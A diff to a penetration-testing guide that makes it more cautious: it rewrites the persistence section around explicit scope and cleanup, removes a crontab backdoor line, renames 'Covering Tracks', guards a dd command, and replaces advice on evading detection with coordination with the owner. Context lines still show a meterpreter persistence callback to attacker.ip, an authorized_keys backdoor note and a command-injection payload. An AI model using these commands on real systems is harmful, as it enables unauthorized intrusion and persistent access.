@@ -81,7 +81,7 @@ Classification of security professionals:
 
 ### Phase 2: Reconnaissance
 
-Gather information without direct system interaction:
+Separate third-party passive research from DNS lookups and tools that may directly contact infrastructure. DNS enumeration and dnsrecon are not guaranteed passive:
 
 **Passive Reconnaissance**
 ```bash
@@ -208,8 +208,8 @@ nikto -h http://target.com
 # OpenVAS (command line)
 omp -u admin -w password --xml="<get_tasks/>"
 
-# Nessus (via API)
-nessuscli scan --target target.com
+# Nessus: use the documented current UI or API scan workflow;
+# nessuscli is not a generic scan --target interface.
 ```
 
 **Web Application Testing (OWASP)**
@@ -286,9 +286,9 @@ sqlmap -u "http://target.com/page.php?id=1" -D database --tables
 # | cat /etc/passwd
 ```
 
-### Phase 6: Maintaining Access
+### Phase 6: Controlled Access Validation
 
-Establish persistent access:
+Persistence is not a routine assessment step. Prefer a disposable lab; any persistence simulation requires separate explicit scope, an expiry, owner-visible artifacts and verified cleanup. Preserve logs and never conceal activity.
 
 **Backdoors**
 ```bash
@@ -299,7 +299,8 @@ meterpreter> run persistence -X -i 30 -p 4444 -r attacker.ip
 # Add attacker's public key to ~/.ssh/authorized_keys
 
 # Cron job persistence
-echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab
+# Do not append arbitrary jobs to system crontab; use a reviewed temporary
+# lab-only test artifact with explicit user, expiry and rollback.
 ```
 
 **Privilege Escalation**
@@ -319,7 +320,7 @@ find / -perm -4000 2>/dev/null
 sudo -l
 ```
 
-**Covering Tracks (Ethical Context)**
+**Evidence Preservation and Cleanup**
 - Document all actions taken
 - Maintain logs for reporting
 - Avoid unnecessary system changes
@@ -400,7 +401,9 @@ Install penetration testing platform:
 **Live USB (Persistent)**
 ```bash
 # Create bootable USB
-dd if=kali-linux.iso of=/dev/sdb bs=512k status=progress
+# Destructive: verify ISO checksum, actual device identity and backup first.
+# /dev/sdb is only a placeholder; selecting a system disk destroys data.
+dd if=kali-linux.iso of=/dev/VERIFIED_USB_DEVICE bs=512k status=progress
 
 # Create persistence partition
 gparted /dev/sdb
@@ -470,9 +473,9 @@ umount /mnt/usb
 
 **Solutions:**
 1. Use slower scan rates
-2. Try different scanning techniques
-3. Use proxy or VPN
-4. Fragment packets
+2. Check scope, rate limits and the agreed test source IP
+3. Coordinate allowlisting or a safer test window with the owner
+4. Do not bypass blocking controls without separate authorization
 
 ### Exploits Failing
 
